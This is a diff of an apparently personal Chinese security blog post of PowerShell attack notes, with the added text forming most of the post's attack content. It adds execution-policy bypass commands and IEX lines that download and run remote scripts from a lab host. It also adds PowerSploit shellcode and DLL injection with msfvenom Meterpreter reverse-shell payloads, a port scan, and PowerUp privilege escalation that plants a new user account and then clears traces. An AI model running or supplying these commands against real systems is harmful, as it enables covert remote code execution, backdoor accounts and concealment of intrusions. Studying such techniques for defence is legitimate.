@@ -81,21 +81,21 @@
 
 
 
-<meta name="description" content="PowerShellpowershell执行策略   策略 说明    Restricted 脚本不能运行   AllSigned 仅当脚本由受信任的发布者签名时才能运行   RemoteSigned 本地创建的脚本可以运行，但从网上下的不能运行   Unrestricted 允许所有的script运行   查看策略 1Get-ExecutionPolicy  设置策略 1Set-Executio">
+<meta name="description" content="PowerShellpowershell执行策略   策略 说明    Restricted 脚本不能运行   AllSigned 仅当脚本由受信任的发布者签名时才能运行   RemoteSigned 本地创建的脚本可以运行，但从网上下的不能运行   Unrestricted 允许所有的script运行">
 <meta name="keywords" content="内网">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PowerShell学习全记录">
 <meta property="og:url" content="http://goudanjun.vip/2021/03/10/PowerShell学习全记录.html/index.html">
 <meta property="og:site_name" content="Goudan&#39;s blog">
-<meta property="og:description" content="PowerShellpowershell执行策略   策略 说明    Restricted 脚本不能运行   AllSigned 仅当脚本由受信任的发布者签名时才能运行   RemoteSigned 本地创建的脚本可以运行，但从网上下的不能运行   Unrestricted 允许所有的script运行   查看策略 1Get-ExecutionPolicy  设置策略 1Set-Executio">
+<meta property="og:description" content="PowerShellpowershell执行策略   策略 说明    Restricted 脚本不能运行   AllSigned 仅当脚本由受信任的发布者签名时才能运行   RemoteSigned 本地创建的脚本可以运行，但从网上下的不能运行   Unrestricted 允许所有的script运行">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://i.loli.net/2021/03/10/HtRshvr8z32Mqmp.png">
 <meta property="og:image" content="https://i.loli.net/2021/03/10/PGA1RtC6njxUdp7.png">
 <meta property="og:image" content="https://i.loli.net/2021/03/10/iNmq8tkLpY3fJb9.png">
-<meta property="og:updated_time" content="2021-03-10T03:34:38.185Z">
+<meta property="og:updated_time" content="2021-03-11T08:36:47.182Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PowerShell学习全记录">
-<meta name="twitter:description" content="PowerShellpowershell执行策略   策略 说明    Restricted 脚本不能运行   AllSigned 仅当脚本由受信任的发布者签名时才能运行   RemoteSigned 本地创建的脚本可以运行，但从网上下的不能运行   Unrestricted 允许所有的script运行   查看策略 1Get-ExecutionPolicy  设置策略 1Set-Executio">
+<meta name="twitter:description" content="PowerShellpowershell执行策略   策略 说明    Restricted 脚本不能运行   AllSigned 仅当脚本由受信任的发布者签名时才能运行   RemoteSigned 本地创建的脚本可以运行，但从网上下的不能运行   Unrestricted 允许所有的script运行">
 <meta name="twitter:image" content="https://i.loli.net/2021/03/10/HtRshvr8z32Mqmp.png">
 
 
@@ -320,7 +320,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  283 字
+                  592 字
                 </span>
               
 
@@ -336,7 +336,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  1 分钟
+                  2 分钟
                 </span>
               
             </div>
@@ -381,6 +381,8 @@
 <td align="center">允许所有的script运行</td>
 </tr>
 </tbody></table>
+<a id="more"></a>
+
 <p>查看策略</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ExecutionPolicy</span></span><br></pre></td></tr></table></figure>
 
@@ -390,7 +392,7 @@
 <h2 id="绕过powershell的执行策略"><a href="#绕过powershell的执行策略" class="headerlink" title="绕过powershell的执行策略"></a>绕过powershell的执行策略</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#绕过本地权限执行</span></span><br><span class="line">powershell.exe -Executionpolicy Bypass -File xxx.ps1</span><br><span class="line"><span class="comment">#本地隐藏绕过权限执行脚本</span></span><br><span class="line">powershell.exe -Executionpolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File xxx.ps1</span><br><span class="line"><span class="comment">#用IEX下载远程PS1脚本绕过权限执行</span></span><br><span class="line">powershell.exe -executionpolicy bypass -windowstyle hidden -nologo -noprofile IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">"xxx.ps1"</span>);[parameters]</span><br></pre></td></tr></table></figure>
 
 <h1 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h1><p><img src="https://i.loli.net/2021/03/10/HtRshvr8z32Mqmp.png" alt="image-20210310102318531"></p>
-<h2 id="powersploit实战（进程注入反弹shell）"><a href="#powersploit实战（进程注入反弹shell）" class="headerlink" title="powersploit实战（进程注入反弹shell）"></a>powersploit实战（进程注入反弹shell）</h2><ol>
+<h2 id="powersploit实战"><a href="#powersploit实战" class="headerlink" title="powersploit实战"></a>powersploit实战</h2><h3 id="Invoke-Shellcode-进程注入反弹shell"><a href="#Invoke-Shellcode-进程注入反弹shell" class="headerlink" title="Invoke-Shellcode 进程注入反弹shell"></a>Invoke-Shellcode 进程注入反弹shell</h3><ol>
 <li><p>MSF中设置监听</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_https</span><br></pre></td></tr></table></figure>
 
@@ -403,17 +405,37 @@
 </li>
 <li><p>目标机下载 invoke-shellcode 和 木马</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">"http://192.168.239.134/powersploit/CodeExecution/Invoke-Shellcode.ps1"</span>)</span><br><span class="line">IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">"http://192.168.239.134/test"</span>)</span><br></pre></td></tr></table></figure>
-
-
-
 </li>
-</ol>
-<ol start="4">
-<li>创建一个新的进程进行注入</li>
+<li><p>创建一个新的进程进行注入</p>
+</li>
 </ol>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Start-Process</span> c:\windows\system32\notepad.exe -WindowStyle Hidden</span><br><span class="line">Invoke-Shellcode -ProcessID <span class="number">2816</span> -Shellcode (<span class="variable">$buf</span>) -Force</span><br></pre></td></tr></table></figure>
 
-<h1 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h1><h1 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h1>
+<h3 id="Invoke-DllInjection：dll注入"><a href="#Invoke-DllInjection：dll注入" class="headerlink" title="Invoke-DllInjection：dll注入"></a>Invoke-DllInjection：dll注入</h3><ol>
+<li><p>使用msfvenom生成一个dll木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.239.134 LPORT=4444 -f dll -o /var/www/html/test.dll</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>下载脚本和木马</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">"http://192.168.239.134/powersploit/CodeExecution/Invoke-DllInjection.ps1"</span>)</span><br><span class="line">IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">"http://192.168.239.134/test.dll"</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>dll注入</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Start-Process</span> c:\windows\system32\notepad.exe -WindowStyle Hidden</span><br><span class="line">Invoke-DllInjection -ProcessID <span class="number">2816</span> -DLL c:\test.dll</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h3 id="Invoke-Portscan：端口扫描"><a href="#Invoke-Portscan：端口扫描" class="headerlink" title="Invoke-Portscan：端口扫描"></a>Invoke-Portscan：端口扫描</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Portscan -hosts <span class="number">192.168</span>.<span class="number">239.1</span>,<span class="number">192.168</span>.<span class="number">239.134</span> -ports <span class="string">"80,22,3389"</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h2><p>主要用来寻找目标主机windows服务漏洞进行提权的脚本</p>
+<h3 id="install-servicebinary模块添加用户"><a href="#install-servicebinary模块添加用户" class="headerlink" title="install-servicebinary模块添加用户"></a>install-servicebinary模块添加用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString(<span class="string">"c:/powerup.ps1"</span>);Install-ServiceBinary -ServiceName <span class="string">'OmniServers'</span> -UserName gd1un -Password 123456</span><br></pre></td></tr></table></figure>
+
+<p>OmniServers服务为一个可写入目录的系统服务，当管理员重新运行这个服务的时候就会创建一个gd1un的账户</p>
+<h3 id="提权成功后清理入侵痕迹"><a href="#提权成功后清理入侵痕迹" class="headerlink" title="提权成功后清理入侵痕迹"></a>提权成功后清理入侵痕迹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString(<span class="string">"c:/powerup.ps1"</span>);Restore-ServiceBinary -ServiceName <span class="string">'OmniServers'</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="MSI文件提权"><a href="#MSI文件提权" class="headerlink" title="MSI文件提权"></a>MSI文件提权</h3><p>查看注册表中的 AlwaysInstallElevated 权限，若为 true 则可进行msi文件提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString(<span class="string">"c:/powerup.ps1"</span>);Get-RegistryAlwaysInstallElevated </span><br><span class="line">Write-UserAddMSI</span><br><span class="line">net user					 <span class="comment">#查看用户</span></span><br><span class="line">net localgroup administrator   <span class="comment">#查看管理员账户</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h1><p>针对 windows ，利用powershell进行内网渗透的集成攻击框架</p>
+<h1 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h1>
       
     </div>
     
@@ -452,6 +474,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/03/11/sql注入报错函数总结.html/" rel="prev" title="sql注入报错函数总结">
+                sql注入报错函数总结 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -528,7 +554,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-count">20</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -591,7 +617,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PowerShell"><span class="nav-number">1.</span> <span class="nav-text">PowerShell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#powershell执行策略"><span class="nav-number">1.1.</span> <span class="nav-text">powershell执行策略</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过powershell的执行策略"><span class="nav-number">1.2.</span> <span class="nav-text">绕过powershell的执行策略</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PowerSploit"><span class="nav-number">2.</span> <span class="nav-text">PowerSploit</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#powersploit实战（进程注入反弹shell）"><span class="nav-number">2.1.</span> <span class="nav-text">powersploit实战（进程注入反弹shell）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Empire"><span class="nav-number">3.</span> <span class="nav-text">Empire</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PowerCat"><span class="nav-number">4.</span> <span class="nav-text">PowerCat</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PowerShell"><span class="nav-number">1.</span> <span class="nav-text">PowerShell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#powershell执行策略"><span class="nav-number">1.1.</span> <span class="nav-text">powershell执行策略</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过powershell的执行策略"><span class="nav-number">1.2.</span> <span class="nav-text">绕过powershell的执行策略</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PowerSploit"><span class="nav-number">2.</span> <span class="nav-text">PowerSploit</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#powersploit实战"><span class="nav-number">2.1.</span> <span class="nav-text">powersploit实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Invoke-Shellcode-进程注入反弹shell"><span class="nav-number">2.1.1.</span> <span class="nav-text">Invoke-Shellcode 进程注入反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Invoke-DllInjection：dll注入"><span class="nav-number">2.1.2.</span> <span class="nav-text">Invoke-DllInjection：dll注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Invoke-Portscan：端口扫描"><span class="nav-number">2.1.3.</span> <span class="nav-text">Invoke-Portscan：端口扫描</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PowerUp"><span class="nav-number">2.2.</span> <span class="nav-text">PowerUp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#install-servicebinary模块添加用户"><span class="nav-number">2.2.1.</span> <span class="nav-text">install-servicebinary模块添加用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权成功后清理入侵痕迹"><span class="nav-number">2.2.2.</span> <span class="nav-text">提权成功后清理入侵痕迹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSI文件提权"><span class="nav-number">2.2.3.</span> <span class="nav-text">MSI文件提权</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Empire"><span class="nav-number">3.</span> <span class="nav-text">Empire</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PowerCat"><span class="nav-number">4.</span> <span class="nav-text">PowerCat</span></a></li></ol></div>
             
 
           </div>
